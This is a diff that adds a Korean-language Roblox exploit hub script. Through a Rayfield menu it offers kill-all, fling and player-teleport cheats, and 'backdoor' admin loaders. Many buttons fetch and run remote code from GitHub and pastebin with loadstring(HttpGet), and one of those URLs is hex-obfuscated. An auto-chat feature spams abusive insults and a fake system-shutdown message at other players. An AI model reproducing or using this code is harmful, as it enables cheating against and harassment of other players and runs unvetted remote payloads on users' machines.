@@ -1,0 +1,2129 @@
+local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/madmad7070/gui/refs/heads/main/gui'))()
+
+local Window = Rayfield:CreateWindow({
+   Name = "니미 허브",
+   Icon = 0, -- Icon in Topbar. Can use Lucide Icons (string) or Roblox Image (number). 0 to use no icon (default).
+   LoadingTitle = "로딩중",
+   LoadingSubtitle = "by chs",
+   Theme = "Default", -- Check https://docs.sirius.menu/rayfield/configuration/themes
+
+   DisableRayfieldPrompts = false,
+   DisableBuildWarnings = false, -- Prevents Rayfield from warning when the script has a version mismatch with the interface
+
+   ConfigurationSaving = {
+      Enabled = false,
+      FolderName = nil, -- Create a custom folder for your hub/game
+      FileName = "Big Hub"
+   },
+
+   Discord = {
+      Enabled = false, -- Prompt the user to join your Discord server if their executor supports it
+      Invite = "noinvitelink", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ ABCD would be ABCD
+      RememberJoins = true -- Set this to false to make them join the discord every time they load it up
+   },
+
+   KeySystem = true, -- Set this to true to use our key system
+   KeySettings = {
+      Title = "CHS",
+      Subtitle = "키 시스템",
+      Note = "키 = chs", -- Use this to tell the user how to get a key
+      FileName = "Key", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
+      SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
+      GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
+      Key = {"chs"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
+   }
+})
+
+
+local Tab = Window:CreateTab("다른 허브☠️", nil) -- Title, Image
+local Section = Tab:CreateSection("메인")
+
+local Button = Tab:CreateButton({
+   Name = "DEX",
+   Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))()
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "IWV hub",
+   Callback = function()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/pudong8452/test_case_h/main/Ray_Free'))() 
+end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "노무허브 (콜라보)",
+   Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RuMinGay/nomu-hub523/refs/heads/main/nomu%20hub523"))()
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "코코허브 (키는 처음에 cute 두번째 hello)",
+   Callback = function()
+loadstring(game:HttpGet(
+    "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x70\x61\x73\x74\x65\x62\x69\x6e\x2e\x63\x6f\x6d\x2f\x72\x61\x77\x2f"
+    .. "\x31\x69\x64\x6e\x35\x47\x69\x65"
+))()
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "로블 핵전문 허브 (키는 팬분들사랑합니다)",
+   Callback = function()
+loadstring(game:HttpGet('https://pastebin.com/raw/MJcXXf5q'))()
+   end,
+})
+local Tab = Window:CreateTab("메인😊", nil) -- Title, Image
+local Section = Tab:CreateSection("메인")
+
+
+local Button = Tab:CreateButton({
+   Name = "투명인간",
+   Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/regentcon/sex/refs/heads/main/sex"))()
+end,
+})
+local Button = Tab:CreateButton({
+   Name = "DEX 스크립트",
+   Callback = function()
+loadstring(game:HttpGet("https://pastebin.com/raw/5Yxd69g3"))()
+end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "HTTPSPY",
+   Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Httpspy/main/httpspy.txt"))()
+end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "블랙홀 스크립",
+   Callback = function()
+loadstring(game:HttpGet("https://pastefy.app/pYhER1z4/raw"))()
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "상대뒤로 티피",
+   Callback = function()
+-- 서비스 가져오기
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+local Workspace = game:GetService("Workspace")
+
+local localPlayer = Players.LocalPlayer
+local camera = Workspace.CurrentCamera
+local targetPlayer = nil
+local teleporting = false
+
+-- 시점 고정용 변수
+local originalCameraSubject = camera.CameraSubject
+
+-- 타겟 플레이어 선택 (자기 자신 제외하고 아무나)
+local function pickTarget()
+    for _, player in pairs(Players:GetPlayers()) do
+        if player ~= localPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+            return player
+        end
+    end
+    return nil
+end
+
+-- 텔레포트 루프
+RunService.RenderStepped:Connect(function()
+    if teleporting and targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
+        local targetHRP = targetPlayer.Character.HumanoidRootPart
+        local myChar = localPlayer.Character
+        if myChar and myChar:FindFirstChild("HumanoidRootPart") then
+            local myHRP = myChar.HumanoidRootPart
+
+            -- 타겟의 뒤 4 studs 위치 + 회전까지 따라감
+            local newCF = targetHRP.CFrame * CFrame.new(0, 0, 3.5)
+            myHRP.CFrame = newCF
+        end
+    end
+end)
+
+-- 입력 감지 (R 토글)
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if gameProcessed then return end
+    if input.KeyCode == Enum.KeyCode.R then
+        teleporting = not teleporting
+        if teleporting then
+            targetPlayer = pickTarget()
+            if camera.CameraSubject then
+                originalCameraSubject = camera.CameraSubject
+            end
+            -- 카메라 흔들림 방지: 고정된 시점 유지
+            camera.CameraSubject = originalCameraSubject
+            print("✅ 따라가기 ON (회전 포함, 시점 고정)")
+        else
+            print("❌ 따라가기 OFF")
+        end
+    end
+end)
+
+end,
+})
+
+
+local Button = Tab:CreateButton({
+   Name = "모든 아이템 가져오기",
+   Callback = function()
+local toolFolder = workspace:FindFirstChild("Tools")
+if toolFolder then
+    for _, tool in pairs(toolFolder:GetChildren()) do
+        if tool:IsA("Tool") then
+            tool.Parent = game.Players.LocalPlayer.Backpack
+        end
+    end
+end
+
+end,
+})
+
+
+
+
+local Button = Tab:CreateButton({
+   Name = "무적(E홀드)",
+   Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/madmad7070/mujck/refs/heads/main/da"))()
+
+end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "올 폴링",
+   Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/madmad7070/allfling/refs/heads/main/allfling"))()
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "올 폴링",
+   Callback = function()
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+
+local localPlayer = Players.LocalPlayer
+local char = localPlayer.Character or localPlayer.CharacterAdded:Wait()
+local rootPart = char:WaitForChild("HumanoidRootPart")
+
+-- GUI 만들기
+local gui = Instance.new("ScreenGui", localPlayer:WaitForChild("PlayerGui"))
+gui.Name = "PullAllPlayersUI"
+
+local startBtn = Instance.new("TextButton", gui)
+startBtn.Size = UDim2.new(0, 200, 0, 50)
+startBtn.Position = UDim2.new(0.5, -100, 0.7, 0)
+startBtn.Text = "모든 사람 끌어오기"
+startBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
+startBtn.TextColor3 = Color3.new(1, 1, 1)
+
+local stopBtn = Instance.new("TextButton", gui)
+stopBtn.Size = UDim2.new(0, 200, 0, 50)
+stopBtn.Position = UDim2.new(0.5, -100, 0.8, 0)
+stopBtn.Text = "작동 중지"
+stopBtn.BackgroundColor3 = Color3.fromRGB(170, 0, 0)
+stopBtn.TextColor3 = Color3.new(1, 1, 1)
+
+-- 변수
+local pulling = false
+local pullingConnection = nil
+
+-- 끌어오기 시작
+startBtn.MouseButton1Click:Connect(function()
+    pulling = true
+
+    -- 루프 실행
+    pullingConnection = RunService.RenderStepped:Connect(function()
+        for _, otherPlayer in pairs(Players:GetPlayers()) do
+            if otherPlayer ~= localPlayer and otherPlayer.Character then
+                local targetRoot = otherPlayer.Character:FindFirstChild("HumanoidRootPart")
+                if targetRoot then
+                    targetRoot.CFrame = rootPart.CFrame * CFrame.new(math.random(-2,2), 0, math.random(-2,2))
+                end
+            end
+        end
+    end)
+end)
+
+-- 끌어오기 중지
+stopBtn.MouseButton1Click:Connect(function()
+    pulling = false
+    if pullingConnection then
+        pullingConnection:Disconnect()
+        pullingConnection = nil
+    end
+end)
+})
+local Button = Tab:CreateButton({
+   Name = "터치 플링",
+   Callback = function()
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService = game:GetService("RunService")
+local Players = game:GetService("Players")
+
+local hiddenfling = true
+
+-- 챗지피티 나이스!
+if not ReplicatedStorage:FindFirstChild("juisdfj0i32i0eidsuf0iok") then
+	local detection = Instance.new("Decal")
+	detection.Name = "juisdfj0i32i0eidsuf0iok"
+	detection.Parent = ReplicatedStorage
+end
+
+-- fling 함수 정의
+local function fling()
+	local hrp, c, vel, movel = nil, nil, nil, 0.1
+	local lp = Players.LocalPlayer
+
+	while true do
+		RunService.Heartbeat:Wait()
+
+		if hiddenfling then
+			while hiddenfling and not (c and c.Parent and hrp and hrp.Parent) do
+				RunService.Heartbeat:Wait()
+				c = lp.Character
+				hrp = c and c:FindFirstChild("HumanoidRootPart")
+			end
+
+			if hiddenfling then
+				vel = hrp.Velocity
+				hrp.Velocity = vel * 10000 + Vector3.new(0, 10000, 0)
+				RunService.RenderStepped:Wait()
+				if c and c.Parent and hrp and hrp.Parent then
+					hrp.Velocity = vel
+				end
+				RunService.Stepped:Wait()
+				if c and c.Parent and hrp and hrp.Parent then
+					hrp.Velocity = vel + Vector3.new(0, movel, 0)
+					movel = movel * -1
+				end
+			end
+		end
+	end
+end
+
+-- fling 코루틴 실행
+coroutine.wrap(fling)()
+
+   end,
+})
+
+
+
+local Toggle = Tab:CreateToggle({
+    Name = "자동 채팅🗣️",
+    CurrentValue = false,
+    Callback = function(state)
+        _G.padrip = state
+
+        task.spawn(function()
+            while _G.padrip do
+                local texts = {
+                    ":                                                                                                                                      시스템 : 버그로인하여 곧 셧다운됩니다.",
+                    ": 레벨이 밥 먹여주디?",
+                    ": 로블에 박혀있는 찐;;특 나오노 ㅋ",
+                    ": ㅂ;;ㅅ ㅋㅋㅋㅋ 말;;빨 검나 딸리네",
+                    ": ㅂ;;ㅅ 니 가;;;;족 마냥 아무것도 모타죠?? ㅋ",
+                    ": ㅂㄷㅂㄷ?? 긁? 긁혔노 이 ;; 기 야 ㅋㅋ"
+                }
+
+                for _, text in ipairs(texts) do
+                    if not _G.padrip then break end
+                    game:GetService("TextChatService").ChatInputBarConfiguration.TargetTextChannel:SendAsync(""..string.rep("\r",1)..text)
+                    task.wait(_G.ChatDelay) -- ✅ 슬라이더에서 설정된 값으로 딜레이 적용
+                end
+            end
+        end)
+    end
+})
+
+
+-- 기본 딜레이 값 설정
+_G.ChatDelay = 1 -- 기본 1초
+
+-- 슬라이더 추가
+local Slider = Tab:CreateSlider({
+    Name = "채팅 딜레이 (초)",
+    Range = {0.1, 50}, -- 0.1초 ~ 5초 사이 조절 가능
+    Increment = 0.1,
+    Suffix = "초",
+    CurrentValue = 1,
+    Callback = function(Value)
+        _G.ChatDelay = Value
+    end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "점프스케어",
+   Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TheqopThe/robax/refs/heads/main/jumpscare.lua"))()
+   end,
+})
+
+local Tab = Window:CreateTab("클라이언트🦾", nil) -- Title, Image
+local Section = Tab:CreateSection("메인")
+
+local Button = Tab:CreateButton({
+   Name = "TOOL GiVER",
+   Callback = function()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub-Backup/main/gametoolgiver.lua'))() 
+end,
+})
+
+local Button = Tab:CreateButton({
+       Name = "맵 바꾸기",
+   Callback = function()
+loadstring(game:GetObjects("rbxassetid://6695644299")[1].Source)()
+
+   end,
+})
+
+    
+local Button = Tab:CreateButton({
+   Name = "AK47",
+   Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/sinret/rbxscript.com-scripts-reuploads-/main/ak47", true))()
+end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "검 모드",
+   Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/regentcon/awdawdasd/refs/heads/main/awdasdawdasd"))()
+end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "칼로 다죽이기2(칼 꺼내기 Z,X,C,V)",
+   Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/regentcon/knifekill/refs/heads/main/knifekill"))()
+end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "칼로 다죽이기(칼 꺼내기 Z,X,C,V)",
+   Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/regentcon/kill/refs/heads/main/QAWD"))()
+end,
+})
+
+
+local Tab = Window:CreateTab("어드민👑", nil) -- Title, Image
+local Section = Tab:CreateSection("메인")
+
+Rayfield:Notify({
+   Title = "인젝됨",
+   Content = "즐겨",
+   Duration = 6.5,
+   Image = 4483362458,
+})
+
+local Button = Tab:CreateButton({
+   Name = "SituationAdmin👑",
+   Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Teemsploit/SituationAdmin.lua/main/admin.lua"))()
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "백도어 어드민👑",
+   Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/madmad7070/admin/refs/heads/main/admin"))()
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "인피니티 야드👑",
+   Callback = function()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+   end,
+})
+
+local Tab = Window:CreateTab("타워🏢", nil) -- Title, Image
+local Section = Tab:CreateSection("메인")
+
+local Button = Tab:CreateButton({
+   Name = "파트 움직이기",
+   Callback = function()
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local LocalPlayer = Players.LocalPlayer
+local Workspace = game:GetService("Workspace")
+
+local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+
+local Folder = Instance.new("Folder", Workspace)
+local Part = Instance.new("Part", Folder)
+local Attachment1 = Instance.new("Attachment", Part)
+Part.Anchored = true
+Part.CanCollide = false
+Part.Transparency = 1
+
+if not getgenv().Network then
+    getgenv().Network = {
+        BaseParts = {},
+        Velocity = Vector3.new(14.46262424, 14.46262424, 14.46262424)
+    }
+
+    Network.RetainPart = function(Part)
+        if typeof(Part) == "Instance" and Part:IsA("BasePart") and Part:IsDescendantOf(Workspace) then
+            table.insert(Network.BaseParts, Part)
+            Part.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)
+            Part.CanCollide = false
+        end
+    end
+
+    local function EnablePartControl()
+        LocalPlayer.ReplicationFocus = Workspace
+        RunService.Heartbeat:Connect(function()
+            sethiddenproperty(LocalPlayer, "SimulationRadius", math.huge)
+            for _, Part in pairs(Network.BaseParts) do
+                if Part:IsDescendantOf(Workspace) then
+                    Part.Velocity = Network.Velocity
+                end
+            end
+        end)
+    end
+
+    EnablePartControl()
+end
+
+local function ForcePart(v)
+    if v:IsA("Part") and not v.Anchored and not v.Parent:FindFirstChild("Humanoid") and not v.Parent:FindFirstChild("Head") and v.Name ~= "Handle" then
+        for _, x in next, v:GetChildren() do
+            if x:IsA("BodyAngularVelocity") or x:IsA("BodyForce") or x:IsA("BodyGyro") or x:IsA("BodyPosition") or x:IsA("BodyThrust") or x:IsA("BodyVelocity") or x:IsA("RocketPropulsion") then
+                x:Destroy()
+            end
+        end
+        if v:FindFirstChild("Attachment") then
+            v:FindFirstChild("Attachment"):Destroy()
+        end
+        if v:FindFirstChild("AlignPosition") then
+            v:FindFirstChild("AlignPosition"):Destroy()
+        end
+        if v:FindFirstChild("Torque") then
+            v:FindFirstChild("Torque"):Destroy()
+        end
+        v.CanCollide = false
+        local Torque = Instance.new("Torque", v)
+        Torque.Torque = Vector3.new(100000, 100000, 100000)
+        local AlignPosition = Instance.new("AlignPosition", v)
+        local Attachment2 = Instance.new("Attachment", v)
+        Torque.Attachment0 = Attachment2
+        AlignPosition.MaxForce = 9999999999999999
+        AlignPosition.MaxVelocity = math.huge
+        AlignPosition.Responsiveness = 200
+        AlignPosition.Attachment0 = Attachment2
+        AlignPosition.Attachment1 = Attachment1
+    end
+end
+
+local blackHoleActive = true
+
+local function toggleBlackHole()
+    blackHoleActive = not blackHoleActive
+    if blackHoleActive then
+        for _, v in next, Workspace:GetDescendants() do
+            ForcePart(v)
+        end
+
+        Workspace.DescendantAdded:Connect(function(v)
+            if blackHoleActive then
+                ForcePart(v)
+            end
+        end)
+
+        spawn(function()
+            while blackHoleActive and RunService.RenderStepped:Wait() do
+                Attachment1.WorldCFrame = humanoidRootPart.CFrame
+            end
+        end)
+    end
+end
+
+local function createRainbowEffect(object, isText)
+    local hue = 0
+    local function updateColor()
+        hue = (hue + 0.002) % 1
+        local color = Color3.fromHSV(hue, 1, isText and 1 or 0.5)  -- Lower brightness for background
+        if isText then
+            object.TextColor3 = color
+        else
+            object.BackgroundColor3 = color
+        end
+    end
+
+    RunService.RenderStepped:Connect(updateColor)
+end
+
+local function createControlButton()
+    local screenGui = Instance.new("ScreenGui")
+    local button = Instance.new("TextButton")
+
+    screenGui.Name = "BlackHoleControlGUI"
+    screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+
+    button.Name = "ToggleBlackHoleButton"
+    button.Size = UDim2.new(0, 200, 0, 50)
+    button.Position = UDim2.new(0.5, -100, 0, 100)
+    button.Text = "파트 끌어오기 실행"
+    button.TextScaled = true
+    button.Parent = screenGui
+
+    local dragging = false
+    local dragInput, mousePos, framePos
+
+    button.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = true
+            mousePos = input.Position
+            framePos = button.Position
+
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then
+                    dragging = false
+                end
+            end)
+        end
+    end)
+
+    button.InputChanged:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+            dragInput = input
+        end
+    end)
+
+    UserInputService.InputChanged:Connect(function(input)
+        if input == dragInput and dragging then
+            local delta = input.Position - mousePos
+            button.Position = UDim2.new(
+                framePos.X.Scale,
+                framePos.X.Offset + delta.X,
+                framePos.Y.Scale,
+                framePos.Y.Offset + delta.Y
+            )
+        end
+    end)
+
+    button.MouseButton1Click:Connect(function()
+        toggleBlackHole()
+        if blackHoleActive then
+            button.Text = "꺼기"
+        else
+            button.Text = "켜기"
+        end
+    end)
+end
+
+createControlButton()
+end,
+})
+local Button = Tab:CreateButton({
+   Name = "파트업애기",
+   Callback = function()
+local p = game.Players.LocalPlayer
+local Tool = Instance.new("Tool")
+Tool.Name = "Fire Parts"
+Tool.RequiresHandle = false
+
+local function keepToolEnabled()
+    if not p.Backpack:FindFirstChild("Fire Parts") then
+        Tool.Parent = p.Backpack
+    end
+
+    Tool.Parent = p.Backpack
+    Tool.Activated:Connect(function()
+        local mouse = p:GetMouse()
+        local target = mouse.Target
+        if target and target:IsA("Part") then
+            local touchInterest = target:FindFirstChildOfClass("TouchTransmitter")
+            
+            if touchInterest then
+                firetouchinterest(p.Character.PrimaryPart, target, 0)
+                firetouchinterest(p.Character.PrimaryPart, target, 1)
+            end
+        end
+    end)
+end
+
+p.CharacterAdded:Connect(function()
+    task.wait(0.1)
+    keepToolEnabled()
+end)
+
+keepToolEnabled()
+
+--camera
+
+local CoreGui = game:GetService("StarterGui")
+
+local onMobile = not game:GetService("UserInputService").KeyboardEnabled
+local keysDown = {}
+local rotating = false
+local ActiveFreecam = false
+
+if not game:IsLoaded() then
+ game.Loaded:Wait() 
+end
+
+local speed = 5
+local sens = 0.3
+
+speed /= 10
+if onMobile then 
+   sens*=2
+end
+
+local function renderStepped()
+ if ActiveFreecam == true then
+    if rotating then
+        local delta = game:GetService("UserInputService"):GetMouseDelta()
+        local cf = workspace.CurrentCamera.CFrame
+        local yAngle = cf:ToEulerAngles(Enum.RotationOrder.YZX)
+        local newAmount = math.deg(yAngle)+delta.Y
+        if newAmount > 65 or newAmount < -65 then
+            if not (yAngle<0 and delta.Y<0) and not (yAngle>0 and delta.Y>0) then
+                delta = Vector2.new(delta.X,0)
+            end 
+        end
+        cf *= CFrame.Angles(-math.rad(delta.Y),0,0)
+        cf = CFrame.Angles(0,-math.rad(delta.X),0) * (cf - cf.Position) + cf.Position
+        cf = CFrame.lookAt(cf.Position, cf.Position + cf.LookVector)
+        if delta ~= Vector2.new(0,0) then workspace.CurrentCamera.CFrame = workspace.CurrentCamera.CFrame:Lerp(cf,sens) end
+        game:GetService("UserInputService").MouseBehavior = Enum.MouseBehavior.LockCurrentPosition
+    else
+        game:GetService("UserInputService").MouseBehavior = Enum.MouseBehavior.Default
+    end
+
+    if keysDown["Enum.KeyCode.W"] then
+        workspace.CurrentCamera.CFrame *= CFrame.new(Vector3.new(0,0,-speed))
+    end
+    if keysDown["Enum.KeyCode.A"] then
+        workspace.CurrentCamera.CFrame *= CFrame.new(Vector3.new(-speed,0,0))
+    end
+    if keysDown["Enum.KeyCode.S"] then
+        workspace.CurrentCamera.CFrame *= CFrame.new(Vector3.new(0,0,speed))
+    end
+    if keysDown["Enum.KeyCode.D"] then
+        workspace.CurrentCamera.CFrame *= CFrame.new(Vector3.new(speed,0,0))
+    end
+    workspace.CurrentCamera.CameraType = Enum.CameraType.Scriptable
+    local controls = require(game:GetService("Players").LocalPlayer.PlayerScripts.PlayerModule):GetControls()
+    controls:Disable()
+ end
+end
+game:GetService("RunService").RenderStepped:Connect(renderStepped)
+
+local validKeys = {"Enum.KeyCode.W","Enum.KeyCode.A","Enum.KeyCode.S","Enum.KeyCode.D"}
+
+game:GetService("UserInputService").InputBegan:Connect(function(Input)
+if ActiveFreecam == true then
+    for i, key in pairs(validKeys) do
+        if key == tostring(Input.KeyCode) then
+            keysDown[key] = true
+        end
+    end
+    if Input.UserInputType == Enum.UserInputType.MouseButton2 or (Input.UserInputType == Enum.UserInputType.Touch and game:GetService("UserInputService"):GetMouseLocation().X>(workspace.CurrentCamera.ViewportSize.X/2)) then
+        rotating = true
+    end
+    if Input.UserInputType == Enum.UserInputType.Touch then
+        if Input.Position.X < workspace.CurrentCamera.ViewportSize.X/2 then
+            touchPos = Input.Position
+        end
+    end
+end
+end)
+
+game:GetService("UserInputService").InputEnded:Connect(function(Input)
+if ActiveFreecam == true then
+    for key, v in pairs(keysDown) do
+        if key == tostring(Input.KeyCode) then
+            keysDown[key] = false
+        end
+    end
+    if Input.UserInputType == Enum.UserInputType.MouseButton2 or (Input.UserInputType == Enum.UserInputType.Touch and game:GetService("UserInputService"):GetMouseLocation().X>(workspace.CurrentCamera.ViewportSize.X/2)) then
+        rotating = false
+    end
+    if Input.UserInputType == Enum.UserInputType.Touch and touchPos then
+        if Input.Position.X < workspace.CurrentCamera.ViewportSize.X/2 then
+            touchPos = nil
+            keysDown["Enum.KeyCode.W"] = false
+            keysDown["Enum.KeyCode.A"] = false
+            keysDown["Enum.KeyCode.S"] = false
+            keysDown["Enum.KeyCode.D"] = false
+        end
+    end
+end
+end)
+
+game:GetService("UserInputService").TouchMoved:Connect(function(input)
+if ActiveFreecam == true then
+    if touchPos then
+        if input.Position.X < workspace.CurrentCamera.ViewportSize.X/2 then
+            if input.Position.Y < touchPos.Y then
+                keysDown["Enum.KeyCode.W"] = true
+                keysDown["Enum.KeyCode.S"] = false
+            else
+                keysDown["Enum.KeyCode.W"] = false
+                keysDown["Enum.KeyCode.S"] = true
+            end
+            if input.Position.X < (touchPos.X-15) then
+                keysDown["Enum.KeyCode.A"] = true
+                keysDown["Enum.KeyCode.D"] = false
+            elseif input.Position.X > (touchPos.X+15) then
+                keysDown["Enum.KeyCode.A"] = false
+                keysDown["Enum.KeyCode.D"] = true
+            else
+                keysDown["Enum.KeyCode.A"] = false
+                keysDown["Enum.KeyCode.D"] = false
+            end
+        end
+    end
+end
+end)
+
+
+--------Freecam Gui
+local ScreenGui1 = Instance.new("ScreenGui") 
+ScreenGui1.Parent = game.CoreGui
+
+local ImageButton1 = Instance.new("ImageButton") 
+ImageButton1.Parent = ScreenGui1
+ImageButton1.Position = UDim2.new(0.9,0,0.2)
+ImageButton1.BackgroundColor3 = Color3.new(0,0,0)
+ImageButton1.BackgroundTransparency = 0.5
+ImageButton1.Size = UDim2.new(0.07,0,0.16)
+ImageButton1.Image = "rbxassetid://6282915548"
+ImageButton1.Draggable = true
+
+local UIStroke1 = Instance.new("UIStroke") 
+UIStroke1.Parent = ImageButton1
+UIStroke1.Transparency = 0
+UIStroke1.Color = Color3.new(1,1,1)
+UIStroke1.Thickness = 2
+
+local UICorner1 = Instance.new("UICorner") 
+UICorner1.Parent = ImageButton1
+UICorner1.CornerRadius = UDim.new(0.2,0)
+
+local ButtonPressedTime = 0
+local ButtonPressed = false
+ImageButton1.MouseButton1Down:Connect(function()
+ButtonPressedTime = 0
+ButtonPressed = true
+while ButtonPressed == true do wait(0.1)
+   ButtonPressedTime += 1
+end
+end)
+
+ImageButton1.MouseButton1Up:Connect(function()
+ButtonPressed = false
+if ButtonPressedTime <= 0.5 then
+   ButtonPressedTime = 0
+   if ActiveFreecam == false then
+      ActiveFreecam = true
+   else
+      ActiveFreecam = false
+      workspace.CurrentCamera.CameraType = Enum.CameraType.Follow
+      local controls = require(game:GetService("Players").LocalPlayer.PlayerScripts.PlayerModule):GetControls()
+      controls:Enable()
+   end
+end
+end)
+--creator
+local Players = game:GetService("Players")
+local StarterGui = game:GetService("StarterGui")
+
+local userId = Players:GetUserIdFromNameAsync("IEnesxvc")
+local thumbType = Enum.ThumbnailType.HeadShot
+local thumbSize = Enum.ThumbnailSize.Size420x420
+local content, isReady = Players:GetUserThumbnailAsync(userId, thumbType, thumbSize)
+
+if isReady then
+    StarterGui:SetCore("SendNotification", {
+        Title = "Made By IEnes",
+        Text = "Thanks for using my script.",
+        Icon = content,
+        Duration = 7
+    })
+end
+end,
+})
+
+
+local Button = Tab:CreateButton({
+   Name = "칼타워 전용 올킬",
+   Callback = function()
+-- .gg/localx
+-- 백팩에 칼 있는 상태에서 K 눌러야 작동합니다
+local sword = "ClassicSword"
+-- "" <- 여기 안에 칼 이름 쓰시면 됩니다.
+local Players = game:GetService('Players')
+local UserInputService = game:GetService('UserInputService')
+local client = Players.LocalPlayer
+
+local function dbug(txt)
+print(`[LocalX]: {txt}`)
+end
+
+-- 칼 있는지 확인
+_G.have_sword = false
+if client.Character:FindFirstChild(sword) then
+    dbug('칼이 존재합니다!')
+    client.Character:FindFirstChild(sword).Parent = client.Backpack
+elseif client.Backpack:FindFirstChild(sword) then
+    dbug('칼이 존재합니다!')
+else
+
+    dbug('칼을 구하는 중입니다...')
+    local search_sword = workspace.ChildAdded:Connect(function(obj)
+    
+    if obj:IsA('Tool') and obj.Name == sword and obj:FindFirstChild('Handle') then
+    client.Character.Humanoid:EquipTool(obj)
+    task.wait(.2)
+    obj.Parent = client.Backpack
+    dbug('칼을 성공적으로 얻었습니다!')
+    _G.have_sword = true
+    end
+    end)
+
+    repeat wait(.1) until _G.have_sword
+    print('aaa')
+    search_sword:Disconnect()
+end
+
+if not _G.Sword_Exploit_Executed then
+    _G.Sword_Exploit_Executed = true
+    _G.Sword_Exploit = false
+
+    UserInputService.InputBegan:Connect(function(input, ...)
+        if input.KeyCode == Enum.KeyCode.K then
+            assert(client.Character:FindFirstChild(sword), '칼을 착용 후 다시 시도하세요.')
+            _G.Sword_Exploit = not _G.Sword_Exploit
+            print(_G.Sword_Exploit)
+            if _G.Sword_Exploit then
+
+                repeat
+                    task.wait()
+
+                    for _, plr in pairs(Players:GetPlayers()) do
+                        if plr ~= client then
+                            pcall(function()
+                                firetouchinterest(client.Character:FindFirstChild(sword).Handle, plr.Character:FindFirstChild('HumanoidRootPart'), 0)
+                                task.wait()
+                                firetouchinterest(client.Character:FindFirstChild(sword).Handle, plr.Character:FindFirstChild('HumanoidRootPart'), 1)
+                            end)
+                        end
+                    end
+                until not _G.Sword_Exploit or not client.Character:FindFirstChild(sword)
+                dbug('end')
+                _G.Sword_Exploit = false
+            end
+
+        end
+    end)
+end
+
+print(_G.Sword_Exploit_Executed)
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "월홉🏢(Q)",
+   Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/madmad7070/wallhop/refs/heads/main/wallhop"))()
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "빡종타 1 (테러 강도 하)",
+   Callback = function()
+      local poss = {
+    Vector3.new(29, 260.5, 112.04998779296875),
+    Vector3.new(29, 260.5, 107.94999694824219),
+    Vector3.new(29, 260.5, 104.04999542236328),
+    Vector3.new(29, 260.5, 96.99998474121094),
+    Vector3.new(29, 260.5, 92.99998474121094),
+    Vector3.new(29, 260.5, 85.99998474121094),
+    Vector3.new(29, 260.5, 81.99998474121094),
+    Vector3.new(29, 260.5, 74.99998474121094),
+    Vector3.new(29, 260.5, 70.99998474121094)
+}
+
+_G.Parts = {}
+
+for _, part in ipairs(workspace:GetChildren()) do
+    if part:IsA('BasePart') and table.find(poss, part.Position) then
+        warn(part)
+        table.insert(_G.Parts, part)
+    end
+end
+print('done!!')
+table.foreach(_G.Parts, print)
+
+
+while task.wait(.1) do
+for _, part in ipairs(_G.Parts) do
+firetouchinterest(game.Players.LocalPlayer.Character.Head, part, 0)
+task.wait(.1)
+firetouchinterest(game.Players.LocalPlayer.Character.Head, part, 1)
+end
+end
+   end,
+})
+
